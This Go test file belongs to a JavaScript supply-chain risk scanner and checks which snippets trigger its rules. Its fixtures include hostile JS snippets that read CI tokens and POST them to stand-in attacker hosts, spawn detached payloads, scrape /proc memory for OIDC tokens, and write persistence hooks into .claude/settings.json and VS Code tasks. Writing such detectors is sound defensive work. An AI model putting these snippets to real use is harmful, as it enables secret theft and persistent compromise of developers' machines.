package jsrisk

import (
	"context"
	"strings"
	"testing"

	"github.com/garagon/aguara/internal/scanner"
	"github.com/garagon/aguara/internal/types"
)

func analyze(t *testing.T, relPath, content string) []types.Finding {
	t.Helper()
	a := New()
	target := &scanner.Target{
		Path:    relPath,
		RelPath: relPath,
		Content: []byte(content),
	}
	findings, err := a.Analyze(context.Background(), target)
	if err != nil {
		t.Fatalf("Analyze returned error: %v", err)
	}
	return findings
}

func hasRule(findings []types.Finding, ruleID string) bool {
	for _, f := range findings {
		if f.RuleID == ruleID {
			return true
		}
	}
	return false
}

func findRule(findings []types.Finding, ruleID string) *types.Finding {
	for i := range findings {
		if findings[i].RuleID == ruleID {
			return &findings[i]
		}
	}
	return nil
}

// --- target gating ---

func TestIsJavaScriptTarget(t *testing.T) {
	cases := []struct {
		path string
		want bool
	}{
		{"script.js", true},
		{"module.mjs", true},
		{"common.cjs", true},
		{"sub/script.JS", true},
		{"/repo/index.js", true},
		{"script.ts", false},
		{"script.json", false},
		{"package.json", false},
		{"README.md", false},
	}
	for _, c := range cases {
		got := isJavaScriptTarget(&scanner.Target{Path: c.path, RelPath: c.path})
		if got != c.want {
			t.Errorf("isJavaScriptTarget(%q) = %v, want %v", c.path, got, c.want)
		}
	}
}

func TestAnalyzer_NonJSFile(t *testing.T) {
	findings := analyze(t, "package.json", `{}`)
	if len(findings) != 0 {
		t.Fatalf("expected no findings for non-JS target, got %d", len(findings))
	}
}

// --- JS_OBF_001 ---

func TestSafe_PlainScript(t *testing.T) {
	findings := analyze(t, "hello.js", `console.log("hello, world");`)
	if hasRule(findings, RuleObfuscation) {
		t.Errorf("plain script must not trigger JS_OBF_001, got: %+v", findings)
	}
}

func TestSafe_MinifiedVendorBundleNoObfSignal(t *testing.T) {
	// Large file, long single line, but no hex identifiers / dispatcher
	// calls / while(!![]). Must not trigger.
	body := strings.Repeat("var foo=function(a,b){return a+b;};", 20000) // ~700KB, single line if no newlines
	findings := analyze(t, "vendor.js", body)
	if hasRule(findings, RuleObfuscation) {
		t.Errorf("minified vendor bundle without obfuscator signals must not trigger JS_OBF_001, got: %+v", findings)
	}
}

func TestVuln_Obfuscation_HexIdentifiersAndWhileTrue(t *testing.T) {
	// 200 _0xNNNN references plus while(!![]) is two obfuscator-specific
	// signals — well above the threshold for JS_OBF_001.
	body := strings.Repeat("var _0xabcd=1;", 200) + "\nwhile(!![]){console.log('a');}\n"
	findings := analyze(t, "payload.js", body)
	f := findRule(findings, RuleObfuscation)
	if f == nil {
		t.Fatalf("expected JS_OBF_001, got: %+v", findings)
	}
	if f.Severity != types.SeverityMedium {
		t.Errorf("obfuscation-only chain should be MEDIUM, got %v", f.Severity)
	}
}

func TestVuln_Obfuscation_EscalatesWithProcessEnv(t *testing.T) {
	body := strings.Repeat("var _0xabcd=1;", 200) + "\nwhile(!![]){var x=process.env.GITHUB_TOKEN;}\n"
	findings := analyze(t, "payload.js", body)
	f := findRule(findings, RuleObfuscation)
	if f == nil {
		t.Fatalf("expected JS_OBF_001, got: %+v", findings)
	}
	if f.Severity != types.SeverityHigh {
		t.Errorf("obfuscation + process.env should be HIGH, got %v", f.Severity)
	}
}

// --- JS_DAEMON_001 ---

func TestSafe_NormalSpawn(t *testing.T) {
	body := `const { spawn } = require('child_process'); spawn('ls', ['-l']);`
	findings := analyze(t, "ok.js", body)
	if hasRule(findings, RuleDaemon) {
		t.Errorf("normal spawn must not trigger JS_DAEMON_001, got: %+v", findings)
	}
}

func TestVuln_Daemon_DetachedIgnoreStdio(t *testing.T) {
	body := `
const cp = require('child_process');
const child = cp.spawn('node', ['./payload.js'], { detached: true, stdio: 'ignore' });
child.unref();
`
	findings := analyze(t, "daemon.js", body)
	f := findRule(findings, RuleDaemon)
	if f == nil {
		t.Fatalf("expected JS_DAEMON_001, got: %+v", findings)
	}
	if f.Severity != types.SeverityHigh {
		t.Errorf("daemon shape alone should be HIGH, got %v", f.Severity)
	}
}

func TestVuln_Daemon_EscalatesWithSecretAccess(t *testing.T) {
	body := `
const cp = require('child_process');
const tok = process.env.GITHUB_TOKEN;
fetch('https://attacker/x', {method:'POST', body:tok});
const child = cp.spawn('node', ['./payload.js'], { detached: true, stdio: 'ignore' });
child.unref();
`
	findings := analyze(t, "daemon2.js", body)
	f := findRule(findings, RuleDaemon)
	if f == nil {
		t.Fatalf("expected JS_DAEMON_001, got: %+v", findings)
	}
	if f.Severity != types.SeverityCritical {
		t.Errorf("daemon + secret/network should be CRITICAL, got %v", f.Severity)
	}
}

func TestSafe_DetachedFalseDoesNotTrigger(t *testing.T) {
	body := `const child = require('child_process').spawn('ls', [], { detached: false, stdio: 'ignore' });`
	findings := analyze(t, "x.js", body)
	if hasRule(findings, RuleDaemon) {
		t.Errorf("detached:false must not trigger daemon, got: %+v", findings)
	}
}

// --- JS_CI_SECRET_HARVEST_001 ---

func TestSafe_SecretReadWithoutSink(t *testing.T) {
	body := `if (process.env.GITHUB_TOKEN) { console.log('have token'); }`
	findings := analyze(t, "x.js", body)
	if hasRule(findings, RuleCISecretHarvest) {
		t.Errorf("secret read without sink must not trigger harvest, got: %+v", findings)
	}
}

func TestVuln_CISecretHarvest_TokenAndFetch(t *testing.T) {
	body := `
const t = process.env.GITHUB_TOKEN;
fetch('https://attacker.example/exfil', {method:'POST', body: t});
`
	findings := analyze(t, "h.js", body)
	f := findRule(findings, RuleCISecretHarvest)
	if f == nil {
		t.Fatalf("expected JS_CI_SECRET_HARVEST_001, got: %+v", findings)
	}
	if f.Severity != types.SeverityCritical {
		t.Errorf("harvest should be CRITICAL, got %v", f.Severity)
	}
	if !strings.Contains(f.MatchedText, "GITHUB_TOKEN") {
		t.Errorf("MatchedText should mention the secret name, got %q", f.MatchedText)
	}
}

func TestVuln_CISecretHarvest_NpmRegistrySink(t *testing.T) {
	body := `
const t = process.env.NPM_TOKEN;
require('https').request('https://registry.npmjs.org/-/npm/v1/tokens', {method:'PUT'});
`
	findings := analyze(t, "p.js", body)
	if !hasRule(findings, RuleCISecretHarvest) {
		t.Errorf("npm registry sink with NPM_TOKEN should trigger harvest, got: %+v", findings)
	}
}

func TestVuln_CISecretHarvest_GitHubGraphQLSink(t *testing.T) {
	body := `
const t = process.env.GITHUB_TOKEN;
fetch('https://api.github.com/graphql', {method:'POST', headers:{Authorization:'Bearer '+t}, body:'{createCommitOnBranch}'});
`
	findings := analyze(t, "g.js", body)
	if !hasRule(findings, RuleCISecretHarvest) {
		t.Errorf("GitHub graphql + token should trigger harvest, got: %+v", findings)
	}
}

func TestVuln_CISecretHarvest_SessionExfilSink(t *testing.T) {
	body := `
const t = process.env.AWS_SECRET_ACCESS_KEY;
fetch('https://filev2.getsession.org/', {method:'POST', body:t});
`
	findings := analyze(t, "s.js", body)
	if !hasRule(findings, RuleCISecretHarvest) {
		t.Errorf("session exfil endpoint should trigger harvest, got: %+v", findings)
	}
}

// --- JS_PROC_MEM_OIDC_001 ---

func TestSafe_ProcOnlyNoOIDC(t *testing.T) {
	body := `const cpu = require('fs').readFileSync('/proc/stat');`
	findings := analyze(t, "x.js", body)
	if hasRule(findings, RuleProcMemOIDC) {
		t.Errorf("/proc/stat read without OIDC must not trigger ProcMemOIDC, got: %+v", findings)
	}
}

func TestVuln_ProcMemOIDC_TokenEnv(t *testing.T) {
	body := `
const fs = require('fs');
const dir = fs.readdirSync('/proc');
for (const pid of dir) {
  const mem = fs.readFileSync('/proc/' + pid + '/mem');
  if (mem.includes(process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN)) {
    fetch('https://attacker/x', {method:'POST', body: mem});
  }
}
`
	findings := analyze(t, "scan.js", body)
	f := findRule(findings, RuleProcMemOIDC)
	if f == nil {
		t.Fatalf("expected JS_PROC_MEM_OIDC_001, got: %+v", findings)
	}
	if f.Severity != types.SeverityCritical {
		t.Errorf("proc mem + OIDC must be CRITICAL, got %v", f.Severity)
	}
}

func TestVuln_ProcMemOIDC_RunnerWorker(t *testing.T) {
	body := `
const maps = require('fs').readFileSync('/proc/self/maps');
if (maps.includes('Runner.Worker')) { /* pivot */ }
`
	findings := analyze(t, "r.js", body)
	if !hasRule(findings, RuleProcMemOIDC) {
		t.Errorf("/proc + Runner.Worker should trigger, got: %+v", findings)
	}
}

// --- AGENT_PERSISTENCE_001 ---

func TestSafe_DocumentationMention(t *testing.T) {
	// A literal /* .claude/settings.json */ inside a code comment in an
	// unrelated tool should still flag because the analyzer cannot know
	// it is a comment. We do not promise to skip comments. Just verify
	// the rule fires consistently on the path mention.
	body := `console.log("hello");`
	findings := analyze(t, "x.js", body)
	if hasRule(findings, RuleAgentPersistence) {
		t.Errorf("script with no agent-path mention must not trigger, got: %+v", findings)
	}
}

func TestVuln_AgentPersistence_ClaudeSettings(t *testing.T) {
	body := `
const fs = require('fs');
fs.writeFileSync(process.env.HOME + '/.claude/settings.json', '{"hooks":{}}');
`
	findings := analyze(t, "ap.js", body)
	f := findRule(findings, RuleAgentPersistence)
	if f == nil {
		t.Fatalf("expected AGENT_PERSISTENCE_001, got: %+v", findings)
	}
	if f.Severity != types.SeverityHigh {
		t.Errorf("agent persistence alone should be HIGH, got %v", f.Severity)
	}
}

func TestVuln_AgentPersistence_VSCodeRunOnFolderOpen(t *testing.T) {
	body := `
require('fs').writeFileSync('.vscode/tasks.json', JSON.stringify({
  tasks: [{label: 'init', command: 'node setup.mjs', runOn: 'folderOpen'}]
}));
`
	findings := analyze(t, "v.js", body)
	if !hasRule(findings, RuleAgentPersistence) {
		t.Errorf("expected AGENT_PERSISTENCE_001 for VS Code folderOpen, got: %+v", findings)
	}
}

func TestVuln_AgentPersistence_EscalatesWithSecretHarvest(t *testing.T) {
	body := `
const t = process.env.GITHUB_TOKEN;
fetch('https://attacker/x', {method:'POST', body:t});
require('fs').writeFileSync(process.env.HOME + '/.claude/settings.json', '{}');
`
	findings := analyze(t, "ap2.js", body)
	f := findRule(findings, RuleAgentPersistence)
	if f == nil {
		t.Fatalf("expected AGENT_PERSISTENCE_001, got: %+v", findings)
	}
	if f.Severity != types.SeverityCritical {
		t.Errorf("persistence + secret harvest must be CRITICAL, got %v", f.Severity)
	}
}

// --- pass-7 fixes: daemon proximity, aliased destructure, whitespace in network ---

func TestSafe_DaemonOptionsFarFromSpawn(t *testing.T) {
	// Daemon-shape options 600 bytes away from a child_process call
	// fall outside the proximity window and must not chain.
	padding := strings.Repeat("// padding line padding line padding line padding line\n", 12)
	body := `
const cp = require('child_process');
cp.spawn('echo', ['hello']);
` + padding + `
const helperConfig = { detached: true, stdio: 'ignore' };
`
	findings := analyze(t, "fp.js", body)
	if hasRule(findings, RuleDaemon) {
		t.Errorf("daemon options outside proximity window must not chain, got: %+v", findings)
	}
}

func TestVuln_AliasedDestructureSecretRead(t *testing.T) {
	body := `
const { GITHUB_TOKEN: t } = process.env;
fetch('https://attacker/x', {method:'POST', body:t});
`
	findings := analyze(t, "al.js", body)
	if !hasRule(findings, RuleCISecretHarvest) {
		t.Errorf("aliased destructured env read must chain harvest, got: %+v", findings)
	}
}

func TestVuln_MixedAliasedAndPlainDestructure(t *testing.T) {
	body := `
const { FOO, GITHUB_TOKEN: t, BAR: b } = process.env;
fetch('https://attacker/x', {body: t});
`
	findings := analyze(t, "mx.js", body)
	if !hasRule(findings, RuleCISecretHarvest) {
		t.Errorf("mixed aliased/plain destructure must still pick CI secret, got: %+v", findings)
	}
}

func TestVuln_NetworkSinkWhitespaceBeforeParen(t *testing.T) {
	body := `
const t = process.env.GITHUB_TOKEN;
fetch ('https://attacker/x', {method:'POST', body: t});
`
	findings := analyze(t, "ws.js", body)
	if !hasRule(findings, RuleCISecretHarvest) {
		t.Errorf("fetch with whitespace before ( must chain harvest, got: %+v", findings)
	}
}

// --- pass-6 fixes: child-process module gate, destructured env reads, runOn context ---

func TestSafe_UnrelatedWorkerSpawnMethod(t *testing.T) {
	// Calling .spawn(...) on an unrelated object should not chain
	// daemon even when the file has detached:true / stdio:'ignore'.
	body := `
const worker = makeWorker();
worker.spawn('node', ['x'], { detached: true, stdio: 'ignore' });
`
	findings := analyze(t, "w.js", body)
	if hasRule(findings, RuleDaemon) {
		t.Errorf("non-child_process spawn must not chain daemon, got: %+v", findings)
	}
}

func TestVuln_DestructuredSpawnImport(t *testing.T) {
	// Destructured import is the more idiomatic Node form; daemon
	// chain must recognize it.
	body := `
const { spawn } = require('child_process');
spawn('node', ['./payload.js'], { detached: true, stdio: 'ignore' });
`
	findings := analyze(t, "ds.js", body)
	if !hasRule(findings, RuleDaemon) {
		t.Errorf("destructured spawn import + invocation must chain, got: %+v", findings)
	}
}

func TestVuln_DestructuredEnvSecretRead(t *testing.T) {
	body := `
const { GITHUB_TOKEN } = process.env;
fetch('https://attacker/x', {method:'POST', body:GITHUB_TOKEN});
`
	findings := analyze(t, "de.js", body)
	if !hasRule(findings, RuleCISecretHarvest) {
		t.Errorf("destructured env read + sink must chain harvest, got: %+v", findings)
	}
}

func TestVuln_DestructuredEnvMultipleNames(t *testing.T) {
	body := `
const { FOO, GITHUB_TOKEN, BAR } = process.env;
require('https').request('https://attacker/x').end(GITHUB_TOKEN);
`
	findings := analyze(t, "dem.js", body)
	if !hasRule(findings, RuleCISecretHarvest) {
		t.Errorf("destructured env with mixed names must still pick CI secret, got: %+v", findings)
	}
}

func TestSafe_RunOnFolderOpenWithoutTasksContext(t *testing.T) {
	// A standalone `runOn: 'folderOpen'` token outside any
	// tasks.json reference (e.g. an extension helper or a schema
	// definition) must not by itself chain persistence.
	body := `
const choices = {
  runOn: ["folderOpen", "manual"],
};
console.log(choices);
`
	findings := analyze(t, "ro.js", body)
	if hasRule(findings, RuleAgentPersistence) {
		t.Errorf("runOn without tasks.json context must not chain, got: %+v", findings)
	}
}

// --- pass-5 fixes: real env reads, real child_process calls, tasks.json gating ---

func TestSafe_SecretNameMentionedNotRead(t *testing.T) {
	// A string that names GITHUB_TOKEN (documentation, error message,
	// UI label) plus an HTTP call must not by itself satisfy the
	// harvest chain.
	body := `
console.error("GITHUB_TOKEN is required");
fetch('https://api.example.com/health');
`
	findings := analyze(t, "doc.js", body)
	if hasRule(findings, RuleCISecretHarvest) {
		t.Errorf("documentation mention of GITHUB_TOKEN must not satisfy harvest, got: %+v", findings)
	}
}

func TestVuln_SecretReadBracketForm(t *testing.T) {
	// process.env['NAME'] form must still count as a real read.
	body := `
const t = process.env['GITHUB_TOKEN'];
fetch('https://attacker/x', {method:'POST', body:t});
`
	findings := analyze(t, "br.js", body)
	if !hasRule(findings, RuleCISecretHarvest) {
		t.Errorf("process.env['GITHUB_TOKEN'] must satisfy harvest, got: %+v", findings)
	}
}

func TestSafe_ChildProcessImportNoInvocation(t *testing.T) {
	// Importing child_process without calling spawn/fork/exec must not
	// satisfy the daemon chain even when an unrelated object literal
	// in the file carries detached:true / stdio:'ignore'.
	body := `
const cp = require('child_process');
const defaultOpts = { detached: true, stdio: 'ignore' };
console.log('cp loaded; opts', defaultOpts);
`
	findings := analyze(t, "imp.js", body)
	if hasRule(findings, RuleDaemon) {
		t.Errorf("child_process import alone must not chain daemon, got: %+v", findings)
	}
}

func TestVuln_ChildProcessSpawnRequired(t *testing.T) {
	body := `
const cp = require('child_process');
cp.spawn('node', ['./payload.js'], { detached: true, stdio: 'ignore' });
`
	findings := analyze(t, "sp.js", body)
	if !hasRule(findings, RuleDaemon) {
		t.Errorf("actual spawn invocation should still chain, got: %+v", findings)
	}
}

func TestVuln_ChildProcessExecAccepted(t *testing.T) {
	// .exec(...) is also an invocation.
	body := `
require('child_process').exec('long-running &', { detached: true, stdio: 'ignore' });
`
	findings := analyze(t, "ex.js", body)
	if !hasRule(findings, RuleDaemon) {
		t.Errorf(".exec() must satisfy child-process invocation, got: %+v", findings)
	}
}

func TestSafe_VSCodeTasksWithoutRunOn(t *testing.T) {
	// Writing a manually-runnable .vscode/tasks.json (no folderOpen)
	// must not by itself trigger AGENT_PERSISTENCE_001.
	body := `
require('fs').writeFileSync('.vscode/tasks.json', JSON.stringify({
  tasks: [{ label: 'manual', command: 'echo' }]
}));
`
	findings := analyze(t, "v.js", body)
	if hasRule(findings, RuleAgentPersistence) {
		t.Errorf("manual .vscode/tasks.json must not chain persistence, got: %+v", findings)
	}
}

func TestVuln_VSCodeTasksWithFolderOpen(t *testing.T) {
	// Adding the folderOpen trigger turns a tasks.json write into
	// real persistence.
	body := `
require('fs').writeFileSync('.vscode/tasks.json', JSON.stringify({
  tasks: [{ label: 'init', command: 'node setup.mjs',
            runOptions: { runOn: 'folderOpen' } }]
}));
`
	findings := analyze(t, "vf.js", body)
	if !hasRule(findings, RuleAgentPersistence) {
		t.Errorf("tasks.json + runOn:folderOpen must chain persistence, got: %+v", findings)
	}
}

// --- pass-4 fixes: distinguish /proc/<pid>/<sub> from root /proc files ---

func TestSafe_ProcMeminfoNotMemoryAccess(t *testing.T) {
	// /proc/meminfo is a root-level file showing system memory totals.
	// Even with an OIDC env reference in the same file, it must not
	// trigger the runner-pivot rule.
	body := `
const totals = require('fs').readFileSync('/proc/meminfo', 'utf8');
console.log(process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN ? 'have' : 'no');
`
	findings := analyze(t, "mi.js", body)
	if hasRule(findings, RuleProcMemOIDC) {
		t.Errorf("/proc/meminfo must not chain ProcMemOIDC, got: %+v", findings)
	}
}

func TestSafe_ProcCmdlineRootNotMemoryAccess(t *testing.T) {
	// /proc/cmdline (no pid segment) shows kernel boot args; it is not
	// a per-process pivot file.
	body := `
const bootArgs = require('fs').readFileSync('/proc/cmdline', 'utf8');
const t = process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN;
`
	findings := analyze(t, "rc.js", body)
	if hasRule(findings, RuleProcMemOIDC) {
		t.Errorf("root-level /proc/cmdline must not chain, got: %+v", findings)
	}
}

func TestVuln_ProcMemTemplateLiteral(t *testing.T) {
	// Template literal `/proc/${pid}/mem` is a real attacker form.
	body := "const fs = require('fs');\nconst m = fs.readFileSync(`/proc/${pid}/mem`);\nif (m.includes(process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN)) {}\n"
	findings := analyze(t, "tmpl.js", body)
	if !hasRule(findings, RuleProcMemOIDC) {
		t.Errorf("template literal /proc/${pid}/mem must chain, got: %+v", findings)
	}
}

func TestVuln_ProcMemLiteralPidNumeric(t *testing.T) {
	body := `
const m = require('fs').readFileSync('/proc/12345/maps');
if (m.includes('Runner.Worker')) {}
`
	findings := analyze(t, "lit.js", body)
	if !hasRule(findings, RuleProcMemOIDC) {
		t.Errorf("literal /proc/12345/maps must chain, got: %+v", findings)
	}
}

// --- pass-3 fixes: property boundary on daemon options + proximate /proc subpath ---

func TestSafe_NotDetachedOption(t *testing.T) {
	// A spawn option literally named `notdetached: true` (or
	// `isDetached: true`) must not satisfy the detached signal.
	body := `
const cp = require('child_process');
cp.spawn('node', ['x'], { notdetached: true, stdio: 'ignore' });
`
	findings := analyze(t, "n.js", body)
	if hasRule(findings, RuleDaemon) {
		t.Errorf("notdetached:true must not chain daemon, got: %+v", findings)
	}
}

func TestSafe_IsDetachedHelperVar(t *testing.T) {
	body := `
const cp = require('child_process');
const isDetached = true;
cp.spawn('node', ['x'], { stdio: 'ignore' });
`
	findings := analyze(t, "i.js", body)
	if hasRule(findings, RuleDaemon) {
		t.Errorf("isDetached helper var must not chain daemon, got: %+v", findings)
	}
}

func TestSafe_IsStdioPropertyDoesNotMatch(t *testing.T) {
	// `isStdio: 'ignore'` must not satisfy the stdio signal.
	body := `
const cp = require('child_process');
cp.spawn('node', ['x'], { detached: true, isStdio: 'ignore' });
`
	findings := analyze(t, "is.js", body)
	if hasRule(findings, RuleDaemon) {
		t.Errorf("isStdio property must not chain stdio, got: %+v", findings)
	}
}

func TestSafe_UnrelatedProcAndCmdlineFarApart(t *testing.T) {
	// A /proc/stat read at the top of a file and an unrelated 'cmdline'
	// identifier near the bottom must not chain as memory access.
	body := `
const stat = require('fs').readFileSync('/proc/stat');
// ... many lines of code ...
` + strings.Repeat("// padding line\n", 30) + `
const myCmdline = 'this is just an identifier';
const t = process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN;
`
	findings := analyze(t, "f.js", body)
	if hasRule(findings, RuleProcMemOIDC) {
		t.Errorf("far-apart /proc/stat + cmdline must not chain, got: %+v", findings)
	}
}

// --- pass-2 fixes: inline require chain sinks + quoted stdio ---

func TestVuln_CISecretHarvest_InlineRequireHttpsRequest(t *testing.T) {
	// Compact payload form: require('https').request(...) without
	// binding the module first. Must still satisfy the network sink.
	body := `
const t = process.env.GITHUB_TOKEN;
require('https').request({hostname:'attacker.example', method:'POST'}).end(t);
`
	findings := analyze(t, "i.js", body)
	if !hasRule(findings, RuleCISecretHarvest) {
		t.Errorf("require('https').request inline form must trigger harvest, got: %+v", findings)
	}
}

func TestVuln_CISecretHarvest_InlineRequireHttpRequest(t *testing.T) {
	body := `
const t = process.env.NPM_TOKEN;
require("http").request("http://attacker/x", {method:"POST"}).end(t);
`
	findings := analyze(t, "i2.js", body)
	if !hasRule(findings, RuleCISecretHarvest) {
		t.Errorf("require(\"http\").request inline form must trigger harvest, got: %+v", findings)
	}
}

func TestVuln_CISecretHarvest_NodeSchemeRequire(t *testing.T) {
	body := `
const t = process.env.GITHUB_TOKEN;
require('node:https').request({hostname:'attacker.example'}).end(t);
`
	findings := analyze(t, "n.js", body)
	if !hasRule(findings, RuleCISecretHarvest) {
		t.Errorf("node: scheme require + token must trigger harvest, got: %+v", findings)
	}
}

func TestVuln_Daemon_QuotedStdioWithoutUnref(t *testing.T) {
	// JSON-quoted spawn options with quoted stdio but no .unref() must
	// still satisfy the daemon shape via stdio:'ignore'.
	body := `
const cp = require('child_process');
cp.spawn('node', ['./payload.js'], {"detached": true, "stdio": "ignore"});
`
	findings := analyze(t, "qs.js", body)
	if !hasRule(findings, RuleDaemon) {
		t.Errorf("quoted stdio:'ignore' must trigger daemon, got: %+v", findings)
	}
}

// --- pass-1 fixes: narrow network sinks, /proc memory, quoted detached ---

func TestSafe_LocalClientPostNotNetworkSink(t *testing.T) {
	// A local helper that happens to expose `.post(...)` (e.g. a
	// pub/sub bus, an ORM, a queue client) must not by itself satisfy
	// the network-sink half of the harvest chain.
	body := `
const queue = require('./local-queue');
const tok = process.env.GITHUB_TOKEN;
queue.post({ id: 1, payload: tok });
`
	findings := analyze(t, "x.js", body)
	if hasRule(findings, RuleCISecretHarvest) {
		t.Errorf("local .post(...) must not satisfy network sink, got: %+v", findings)
	}
}

func TestSafe_ProcStatNotMemoryAccess(t *testing.T) {
	// A benign /proc/stat read paired with an OIDC env reference must
	// not trigger JS_PROC_MEM_OIDC_001: the rule targets
	// /proc/<pid>/(mem|maps|cmdline) specifically.
	body := `
const fs = require('fs');
const stat = fs.readFileSync('/proc/stat', 'utf8');
console.log(process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN ? 'yes' : 'no');
`
	findings := analyze(t, "stat.js", body)
	if hasRule(findings, RuleProcMemOIDC) {
		t.Errorf("/proc/stat alone must not trigger ProcMemOIDC, got: %+v", findings)
	}
}

func TestVuln_Daemon_QuotedDetachedProperty(t *testing.T) {
	// JSON-style spawn options must still chain.
	body := `
const cp = require('child_process');
const child = cp.spawn('node', ['./payload.js'], {"detached": true, "stdio": "ignore"});
child.unref();
`
	findings := analyze(t, "q.js", body)
	if !hasRule(findings, RuleDaemon) {
		t.Errorf("quoted \"detached\": true must trigger daemon, got: %+v", findings)
	}
}

func TestVuln_ProcMemSelfMaps(t *testing.T) {
	// /proc/self/maps with Runner.Worker reference is the canonical
	// runner-pivot shape.
	body := `
const maps = require('fs').readFileSync('/proc/self/maps');
if (maps.includes('Runner.Worker')) { /* found runner */ }
`
	findings := analyze(t, "rm.js", body)
	if !hasRule(findings, RuleProcMemOIDC) {
		t.Errorf("/proc/self/maps + Runner.Worker must trigger, got: %+v", findings)
	}
}

// --- finding shape regression ---

func TestFindingsHaveStableFields(t *testing.T) {
	body := `
const t = process.env.GITHUB_TOKEN;
fetch('https://attacker/x', {method:'POST', body:t});
require('fs').writeFileSync(process.env.HOME + '/.claude/settings.json', '{}');
const cp = require('child_process');
const c = cp.spawn('node', ['x'], {detached: true, stdio: 'ignore'}); c.unref();
const m = require('fs').readFileSync('/proc/self/maps');
if (m.includes(process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN)) {}
`
	findings := analyze(t, "full.js", body)
	if len(findings) == 0 {
		t.Fatalf("expected findings, got none")
	}
	seenLines := map[int]string{}
	for _, f := range findings {
		if f.Analyzer != AnalyzerName {
			t.Errorf("finding %s: analyzer = %q, want %q", f.RuleID, f.Analyzer, AnalyzerName)
		}
		if f.Category != "supply-chain" {
			t.Errorf("finding %s: category = %q, want supply-chain", f.RuleID, f.Category)
		}
		if !strings.HasPrefix(f.RuleID, "JS_") && !strings.HasPrefix(f.RuleID, "AGENT_") {
			t.Errorf("finding ruleID %q should have JS_ or AGENT_ prefix", f.RuleID)
		}
		if f.Confidence == 0 {
			t.Errorf("finding %s: confidence should be > 0", f.RuleID)
		}
		if f.Remediation == "" {
			t.Errorf("finding %s: remediation should be non-empty", f.RuleID)
		}
		if f.Line == 0 {
			t.Errorf("finding %s: line should be > 0", f.RuleID)
		}
		if prev, ok := seenLines[f.Line]; ok {
			t.Logf("two findings on line %d: %s and %s (cross-rule dedup may drop one)", f.Line, prev, f.RuleID)
		}
		seenLines[f.Line] = f.RuleID
	}
}
